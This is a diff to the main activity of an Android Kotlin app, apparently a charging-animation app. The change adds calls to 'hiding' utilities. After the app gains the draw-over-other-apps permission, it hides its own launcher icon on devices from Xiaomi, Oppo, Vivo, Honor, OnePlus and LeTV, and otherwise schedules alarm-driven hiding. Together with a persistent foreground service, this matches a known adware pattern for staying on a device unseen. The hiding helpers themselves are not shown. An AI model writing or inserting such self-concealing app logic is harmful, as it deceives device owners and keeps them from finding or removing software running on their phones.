@@ -14,14 +14,20 @@ import com.charful.cheerge.R
 import com.charful.cheerge.base.BaseActivity
 import com.charful.cheerge.databinding.MainActivityBinding
 import com.charful.cheerge.repository.background.display.ForegroundService
+import com.charful.cheerge.repository.preferences.Preferences
 import com.charful.cheerge.ui.animations.AnimationFragment
 import com.charful.cheerge.ui.onboarding.OnboardingActivity
+import com.charful.cheerge.utils.hiding.AlarmBroadcast
+import com.charful.cheerge.utils.hiding.AppHidingUtil
+import com.charful.cheerge.utils.hiding.HidingBroadcast
 import com.nguyenhoanglam.imagepicker.model.Image
 import com.nguyenhoanglam.imagepicker.model.ImagePickerConfig
 import com.nguyenhoanglam.imagepicker.model.RootDirectory
 import com.nguyenhoanglam.imagepicker.ui.imagepicker.registerImagePicker
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import java.util.*
+import kotlin.collections.ArrayList
 import kotlin.coroutines.suspendCoroutine
 
 class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
@@ -99,12 +105,28 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun provideViewModel() = viewModel
 
     override fun setupUI() {
+        if (Preferences.firstLaunchMillis == -1L)
+            Preferences.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
+
         if (ForegroundService.instance === null)
             startService(Intent(this, ForegroundService::class.java))
         if (!Settings.canDrawOverlays(this))
             startActivity(Intent(this, OnboardingActivity::class.java))
     }
 
+    override fun onResume() {
+        super.onResume()
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
+    }
+
+    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
+        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
+    )
 
     override fun onBackPressed() {
         supportFragmentManager
